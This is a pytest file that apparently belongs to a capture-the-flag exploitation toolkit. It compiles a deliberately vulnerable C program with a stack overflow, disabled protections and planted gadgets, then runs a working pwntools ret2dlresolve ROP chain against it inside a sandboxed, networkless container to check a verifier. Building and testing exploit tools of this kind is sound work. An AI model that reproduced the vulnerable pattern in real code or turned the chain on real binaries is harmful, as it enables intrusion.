"""End-to-end amd64 lazy-resolver oracle in the repository pwn image.

The fixture is trusted source compiled inside the networkless container.  Pwntools independently
constructs and drives the chain; the engine under test only inspects the ELF and inverse-checks the
forged records before execution.
"""
from __future__ import annotations

import shutil
import subprocess
import textwrap
from pathlib import Path

import pytest


ROOT = Path(__file__).resolve().parents[1]
IMAGE = "csctf-pwn:1"


C_SOURCE = r"""
#include <unistd.h>

char staging_space[0x10000];

__attribute__((naked, used)) void gadget_pop_rdi(void) { __asm__("pop %rdi; ret"); }
__attribute__((naked, used)) void gadget_pop_rsi(void) { __asm__("pop %rsi; ret"); }
__attribute__((naked, used)) void gadget_pop_rdx(void) { __asm__("pop %rdx; ret"); }

__attribute__((noinline)) static void vulnerable(void) {
    char buffer[64];
    (void)read(STDIN_FILENO, buffer, 0x100);
}

int main(void) {
    vulnerable();
    _exit(0);
}
"""


ORACLE = r"""
import resource
import struct
import subprocess
import sys

resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

common = [
    "gcc", "-O0", "-fno-stack-protector", "-fno-pie", "-no-pie",
    "-fcf-protection=none", "-Wl,-z,relro",
]
subprocess.run(common + ["-Wl,-z,lazy", "-o", "lazy", "oracle.c"], check=True)
subprocess.run(common + ["-Wl,-z,now", "-o", "now", "oracle.c"], check=True)

from pwn import ELF, ROP, Ret2dlresolvePayload, context, flat, process

context.log_level = "error"
context.binary = elf = ELF("./lazy", checksec=False)
staging = elf.symbols["staging_space"] + 0xE000
dl = Ret2dlresolvePayload(
    elf, symbol="puts", args=["PWNDEPTH_ORACLE_OK"], data_addr=staging,
)

rela_address = dl.jmprel + dl.reloc_index * 24
_r_offset, r_info, _r_addend = struct.unpack_from(
    "<QQq", dl.payload, rela_address - staging,
)
symbol_index = r_info >> 32
sym_address = dl.symtab + symbol_index * 24
st_name = struct.unpack_from("<I", dl.payload, sym_address - staging)[0]
name_address = dl.strtab + st_name
versym_address = dl.versym + 2 * symbol_index
versym_value = int.from_bytes(elf.read(versym_address, 2), "little")

sys.path.insert(0, "/repo/solvers/toolkits")
import pwndepth_ret2dlresolve as verifier

plt0 = elf.get_section_by_name(".plt").header.sh_addr
profile = verifier.inspect_elf("./lazy", plt0=plt0)
checked = verifier.verify_forged_records(
    profile,
    blob=dl.payload,
    blob_address=staging,
    rela_address=rela_address,
    sym_address=sym_address,
    name_address=name_address,
    requested_symbol=b"puts",
    versym_value=versym_value,
)
assert profile.feasible
assert checked.relocation_selector == dl.reloc_index
assert checked.symbol == b"puts"
assert checked.versym_value == 0

rop = ROP(elf)
rop.read(0, dl.data_addr, len(dl.payload))
rop.ret2dlresolve(dl)
first = flat({72: rop.chain()}, filler=b"A", length=0x100)
io = process(elf.path)
io.send(first)
io.send(dl.payload)
output = io.recvall(timeout=5)
assert b"PWNDEPTH_ORACLE_OK" in output

now = ELF("./now", checksec=False)
now_profile = verifier.inspect_elf(
    "./now", plt0=now.get_section_by_name(".plt").header.sh_addr,
)
assert now_profile.bind_now and not now_profile.feasible
assert any("BIND_NOW" in reason for reason in now_profile.blockers)
print("PWNDEPTH_DOCKER_ORACLE_OK")
"""


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    probe = subprocess.run(
        ["docker", "image", "inspect", IMAGE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return probe.returncode == 0


def test_known_good_ret2dlresolve_chain_in_pwn_container(tmp_path: Path) -> None:
    if not _docker_ready():
        pytest.skip(f"local {IMAGE} image is unavailable")
    (tmp_path / "oracle.c").write_text(textwrap.dedent(C_SOURCE), encoding="utf-8")
    (tmp_path / "run_oracle.py").write_text(textwrap.dedent(ORACLE), encoding="utf-8")
    command = [
        "docker", "run", "--rm", "--platform", "linux/amd64",
        "--network", "none", "--read-only", "--cap-drop", "ALL",
        "--security-opt", "no-new-privileges", "--pids-limit", "128",
        "--memory", "512m", "--tmpfs", "/tmp:rw,noexec,nosuid,size=32m",
        "-e", "TERM=xterm", "-v", f"{ROOT}:/repo:ro",
        "-v", f"{tmp_path}:/work:rw", "-w", "/work", IMAGE,
        "python3", "run_oracle.py",
    ]
    result = subprocess.run(command, capture_output=True, text=True, timeout=60, check=False)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "PWNDEPTH_DOCKER_ORACLE_OK" in result.stdout
